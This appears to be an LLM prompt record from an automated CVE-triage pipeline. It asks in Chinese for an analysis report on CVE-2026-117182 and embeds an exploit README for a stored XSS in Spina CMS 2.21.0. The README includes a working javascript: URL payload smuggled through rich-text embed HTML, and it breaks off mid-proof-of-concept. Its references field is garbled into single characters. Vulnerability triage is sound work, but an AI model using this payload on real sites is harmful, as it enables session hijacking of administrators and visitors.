    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-117182\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"An authenticated cross-site scripting (XSS) vulnerability in the /spina/embeddable.rb component of Spina CMS v2.21.0 allows attackers to execute arbitrary web scripts or HTML via injecting a crafted URL.\", \"\\u6807\\u9898: Spina CMS \\u5b58\\u50a8\\u578b\\u8de8\\u7ad9\\u811a\\u672c\\u6f0f\\u6d1e\"], \"published_date\": \"2026-10-30T16:17:41.560\", \"last_modified_date\": \"2026-10-30T19:39:14.897\", \"cvss_score\": null, \"severity\": null, \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"P\", \"r\", \"i\", \"m\", \"a\", \"n\", \"d\", \"i\", \"t\", \"o\", \"/\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"1\", \"1\", \"7\", \"1\", \"8\", \"2\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"S\", \"p\", \"i\", \"n\", \"a\", \"C\", \"M\", \"S\", \"/\", \"S\", \"p\", \"i\", \"n\", \"a\", \"/\", \"i\", \"s\", \"s\", \"u\", \"e\", \"s\", \"/\", \"1\", \"4\", \"5\", \"2\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/ee06aa1a25dbcd2cc6d274bbd3242c35/README.md\n---\n# CVE-2026-117182 — Authenticated Stored XSS via SafeUrlValidator Bypass in Spina CMS 2.21.0\n\n![CVE](https://img.shields.io/badge/CVE-2026--117182-red)\n![Version](https://img.shields.io/badge/SpinaCMS-2.21.0-blue)\n![Status](https://img.shields.io/badge/status-unpatched-red)\n![CVE State](https://img.shields.io/badge/CVE%20state-published-brightgreen)\n\n## Summary\n\nSpina CMS v2.21.0 allows an authenticated staff user to perform **Stored Cross-Site Scripting (XSS)** on the public site. `Spina::SafeUrlValidator` (introduced in PR #1448) only runs when an embed is saved through the admin embed form. However, rich text content is saved via the page edit form (`Spina::Parts::Text`), which does not trigger this validation.\n\nWhen a page renders, the embed is rebuilt from stored HTML/JSON by `Spina::Embeddable.from_json`, which performs no validation, and is then output via `link_to button.url`. Because the entire document is wrapped in a `SafeBuffer` by `RichTextPresenter#to_s`, a `javascript:` URL stored in the rich text bypasses validation and becomes a live `href`, leading to script execution in the origin of the public site.\n\n**Impact:** An attacker with an authenticated CMS account can inject a payload that executes when an unauthenticated visitor or a logged-in administrator views the public page. This can lead to session hijacking, CSRF token extraction, and unauthorized authenticated actions on behalf of an admin.\n\n| Field | Value |\n|-------|-------|\n| CVE ID | CVE-2026-117182 |\n| Official Record | [cve.org/CVERecord?id=CVE-2026-117182](https://www.cve.org/CVERecord?id=CVE-2026-117182) |\n| Affected Version | Spina CMS (Ruby gem) <= 2.21.0 |\n| Vulnerability Type | CWE-79: Cross-Site Scripting (Stored XSS) |\n| Attack Vector | Network |\n| Privileges Required | Low (Requires an authenticated CMS account) |\n| Affected Component | `Spina::RichTextPresenter`, `Spina::Embeddable.from_json`, `Spina::Admin::PagesController#page_params`, `app/views/spina/embeds/buttons/_button.html.erb` |\n| Original Report | [SpinaCMS/Spina#1452](https://github.com/SpinaCMS/Spina/issues/1452) |\n\n---\n\n## Affected Files\n\n| File Path | Description |\n|-----------|-------------|\n| `app/presenters/spina/rich_text_presenter.rb` | Wraps the entire document in a `SafeBuffer` without sanitization. |\n| `lib/spina/embeddable.rb` | Rebuilds embed from JSON without validating the URL scheme. |\n| `app/controllers/spina/admin/pages_controller.rb` | Permits all params (`permit!`), bypassing model-level validation on the rich text path. |\n| `app/views/spina/embeds/buttons/_button.html.erb` | Outputs `link_to button.url` directly to the public site. |\n\n---\n\n## Vulnerable Code\n\n### The Two Paths\n\n**Path 1: Embed Form (Validated)**\nThe embed form builds the object through the model, triggering the validator.\n\n```ruby\n# app/controllers/spina/admin/embeds_controller.rb:9\n@embeddable = Spina::Embeds.constantize(embed_type).new(embed_params)\n\n# app/models/spina/embeds/button.rb:7-8\nvalidates :url, :label, presence: true\n```\n\n**Path 2: Rich Text (Unvalidated)**\nRich text content is saved directly through the page params and rendered later without validation.\n\n```ruby\n# app/controllers/spina/admin/pages_controller.rb\ndef page_params\n  params.require(:page).permit!\nend\n\n# lib/spina/embeddable.rb:11-18, reached from rich_text_presenter.rb:37\ndef from_json(json)\n  attributes = JSON.parse(json)\n  attributes.transform_keys!(&:to_sym)\n  new(attributes)\nrescue\n  Rails.logger.error \"[#{self.class.name}] Couldn't parse JSON\"\n  nil\nend\n```\n\nThe sink where the unsanitized URL is rendered:\n\n```erb\n<%# app/views/spina/embeds/buttons/_button.html.erb %>\n<%= link_to button.url do %>\n  <%= button.label %>\n<% end %>\n```\n\n**Contributing factor:** `RichTextPresenter#to_s` wraps the entire document in an `ActiveSupport::SafeBuffer`, meaning anything that isn't an embed `<figure>` is passed through untouched.\n\n---\n\n## Proof of Concept\n\n### Prerequisites\n\n- Spina CMS v2.21.0 running locally (tested on Rails 8.1.3).\n- An authenticated CMS account with permission to edit page content.\n- Firefox 153.4.0esr (64-bit) for testing user activation.\n\n### Step 1 — Control Case (Validator Works on Form)\n\n```ruby\nSpina::Embeds::Button.new(\n  url: \"javascript:void(document.title=String.fromCharCode(88))\",\n  label: \"Click me\"\n).valid?\n# => false, \"Url must be a relative path or start with http://, https://, mailto: or tel:\"\n```\n\n### Step 2 — Storing the Payload via Rich Text\n\nSend a `PATCH /admin/pages/1` request with a normal CSRF token, storing the following HTML as the content of any `Spina::Parts::Text` part on a published page:\n\n```html\n<figure data-trix-content-type=\"application/vnd+spina.embed+html\">\n  <spina-embed data-embed-type=\"Spina::Embeds::Button\"\n    data-embed-attributes='{\"url\":\"javascript:void(document.title=String.fromCharCode(88))\",\"label\":\"Click me\"}'>\n  </spina-embed>\n</figure>\n```\n\n### Step 3 — Execution\n\nNavigate to `GET /`\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
